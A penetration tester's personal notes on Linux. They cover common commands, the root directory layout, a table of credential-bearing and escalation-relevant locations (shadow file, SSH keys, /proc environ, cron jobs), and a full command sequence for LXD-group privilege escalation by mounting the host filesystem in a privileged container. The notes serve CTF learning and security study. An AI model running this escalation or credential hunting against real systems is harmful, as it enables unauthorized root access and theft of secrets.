# Linux

I wanted to list some concepts, terms and flows that are specific to Linux. Learning more about Linux has made me a better and more effcient pentration tester.

## Basic Commands

There are some commands that I use all the time. I have put together a list of the most common commands I use while doing a capture the flag event. All the commands have optional flags that can enhance what the commands do. When I need help with a command I run `man <command>` to get a more detailed description of each command. Here are the most common commands that I use:

| Command | Purpose |
| ------------- | -------------- |
| `ls` | Lists files and directories in the current location. |
| `cd` | Changes the current directory. |
| `pwd` | Prints the current working directory. |
| `mkdir` | Creates a new directory. |
| `rm` | Removes files or directories. |
| `cp` | Copies files or directories. |
| `mv` | Moves or renames files and directories. |
| `touch` | Creates an empty file or updates timestamps. |
| `cat` | Displays file contents. |
| `nano` or `vim` | Opens a text editor, nano is more beginner friendly. |
| `chmod` | Changes file permissions. |
| `chown` | Changes file ownership. |
| `find` | Searches for files and directories. |
| `grep` | Searches text using patterns (regex). |
| `ps aux` | Lists all running processes. |
| `kill` | Terminates processes by PID or name. |

## Directories

It helps to have a basic understanding of the directories at the root `/` level of Linux. Here are the directories and a description of what they do:

| Directory | Description |
| ------------- | -------------- |
| `/bin` | Essential user binaries (e.g., `ls`, `cp`, `mv`) needed for basic system operation. Most of the commands in the previous section are here. |
| `/boot` | Files needed for booting the system (e.g., GRUB, Linux kernel). |
| `/dev` | Device files (e.g., `/dev/sda` for disks, `/dev/null`).  |
| `/etc` | System-wide configuration files and settings. These files are critical for the system. |
| `/home` | User home directories (e.g., `/home/kwmd`). The `root` user does not have their home directory here. |
| `/lib` | Essential shared libraries used by binaries in `/bin` and `/sbin`. |
| `/lib64` | 64-bit versions of libraries (on 64-bit systems). |
| `/media` | Mount point for removable media (e.g., USB drives, CDs). |
| `/mnt` | Temporary mount point for filesystems (manually mounted drives). |
| `/opt` | Optional or third-party software packages. |
| `/proc` | Virtual filesystem providing process and kernel information. In Linux everything is a file including processes. |
| `/root` | Home directory of the `root` user (not the same as `/`). |
| `/run` | Runtime variable data (e.g., PID files, sockets). |
| `/sbin` | System binaries (administrative commands, e.g., `reboot`, `iptables`). |
| `/srv` | Data for services like FTP, HTTP (e.g., `/srv/www`). |
| `/sys` | Virtual filesystem exposing system and hardware info. |
| `/tmp` | Temporary files (often cleared on reboot). Usually all users have read and write permissions in this directory. |
| `/usr` | Secondary hierarchy for user programs and data (e.g., `/usr/bin`, `/usr/lib`). |
| `/var` | Variable files (logs, mail, spool files, etc.). |

During a penetration test, knowing which directories on a Linux system contain potentially sensitive or valuable information can help with privilege escalation, lateral movement, or data exfiltration. Here are some of the valuable contents in these directories that I am looking for when I do a penetration test:

| Directory | What to Look For |
| ------------- | -------------- |
| `/bin`, `/sbin`, `/usr/bin`, `/usr/sbin` | SUID/SGID binaries (e.g., `find / -perm -4000 2>/dev/null`). Custom or unusual binaries that may reveal misconfigurations or be exploitable. |
| `/boot` | Kernel version (vmlinuz-*) may help identify known kernel exploits. Grub configs (grub.cfg) may expose passwords or kernel boot options. |
| `/dev` | Access to devices like /dev/mem, /dev/kmem, or disks (if permissions are misconfigured). Sometimes misconfigured device files can lead to privilege escalation. |
| `/etc` | Credentials in config files (e.g., /etc/passwd, /etc/shadow, /etc/fstab). Misconfigured services (e.g., Apache, SSH, cron jobs). Backup files or .old, .bak, .save versions of configs. Misconfigured sudoers file (/etc/sudoers). |
| `/home` | User SSH keys (~/.ssh/id_rsa, authorized_keys). Saved credentials in history or config files (e.g., .bash_history, .gitconfig). Enumerate all users and check for global-readable files. |
| `/lib`, `/lib64`, `/usr/lib` | Look for malicious shared libraries or LD_PRELOAD abuse opportunities. Checking if libraries have known vulnerabilities for privilege escalation. |
| `/media`, `/mnt` | Mounted drives, USBs, or file shares that may contain sensitive data or credentials. Misconfigured mounts that allow unauthorized access. |
| `/opt` | Third-party or custom applications often reside here. Check for hardcoded credentials, scripts, misconfigurations. Exploitable software with escalated permissions. |
| `/proc` | Process info, environment variables (/proc/*/environ), open file descriptors, command-line args. May reveal passwords, tokens, or useful debug info. Inspect /proc/net/tcp, /proc/[pid]/fd/, /proc/[pid]/cmdline. |
| `/root` | Everything in this directory is gold: history files, SSH keys, scripts, notes. Only accessible if you get root—but once you do, enumerate it fully. Usually being the root user and reading a file from this directory is the goal of a capture the flag. |
| `/run` | Runtime data like PID files and sockets. Active sessions or credentials in memory may show up here. |
| `/srv` | Web server data (e.g., /srv/www) or FTP files. Look for exposed sensitive web files, backups, or logs. |
| `/sys` | Hardware and system configuration. Typically less valuable, but may reveal kernel modules, USB devices, or info for kernel exploits. |
| `/tmp` | Global-writable directory that is often used for privilege escalation. Look for temp files with credentials, open sockets, or running binaries. |
| `/var` | Logs are stored in the /var/log/ directory: check the log files of various services (auth.log, secure, apache2/, mysql/, etc...). Mail is stored in /var/mail: users' mail may contain sensitive information like usernames and passwords. Cron jobs are stored in /var/spool/cron: privileged recurring tasks that can sometimes be hijacked. Databases are stored can be stored in /var/lib/mysql: configuration files and backups files might be in here. Website files are stored in /var/www: configuration files can contain sensitive information. |

## LXD (pronounced lex-dee)

LXD is used to manage virtual machines and system containers. It has very minimal overhead. I have used both Docker and Podman in the past and it works very similar to both.

I can create or download an image, start multiple containers from that single image and have them interact with each other.

The lxc command is used to start and stop containers. To use the lxd and lxc binaries my user was in the lxd group. The example below will allow a user that is in the lxd group but not root to do a privilege escalation to root. The neat part is that the user will be root in the container and the host will map the actions of the root user in the container to the root user on the host.

Below is an example of how to download an alpine image from github and then run the container. Some of the file names may have changed but the concept should be the same.

Step 1 - Download the image from github.

```bash
$ git clone https://github.com/saghul/lxd-alpine-builder.git
```

Step 2 - Import the image and alias it as alpine.

```bash
$ cd lxd-alpine-builder
$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
```

I normally check if it imported by running the following:

```bash
$ lxc image list
```

Step 3 - Create a container from the image named kwmd.

```bash
$ lxc init alpine kwmd -c security.privileged=true
```

The security.privileged=true configuration option maps the container uid 0 to the host's uid 0. In other words, the container's user is root and will run as root on the host machine.

Step 4 - Map the host hard drive to the container hard drive, I alias the drive as mydrive in this example.

```bash
$ lxc config device add kwmd mydrive disk source=/ path=/mnt/root recursive=true
```

This mounts the / directory on the host to the /mnt/root directory in the container. This combined with the security.privileged=true in step 3 is very dangerous.

Step 5 - Start the container.

```bash
$ lxc start kwmd
```

Step 6 - Enter the container with a shell.

```bash
$ lxc exec kwmd /bin/sh
```

The cursor will show up as a # character to let me know I am root.

I can now modify view or modify any file on the host directory. I just need to remember to prepend any directory with /mnt/root. Here are some examples:

- The /etc directory on the host would be /mnt/root/etc from the container.
- The /home directory on the host would be /mnt/root/home from the container.
- The /root directory on the host would be /mnt/root/root from the container.

Since I am root in the container and security.privileged=true was set, the host operating system maps any of my root container actions to the root user on the host machine.

## Privilege Escalation

I have noted the process I use for [Linux privilege escalation](../concepts/privilege_escalation.md#linux-privilege-escalation) in the [concepts](../concepts/README.md) directory.
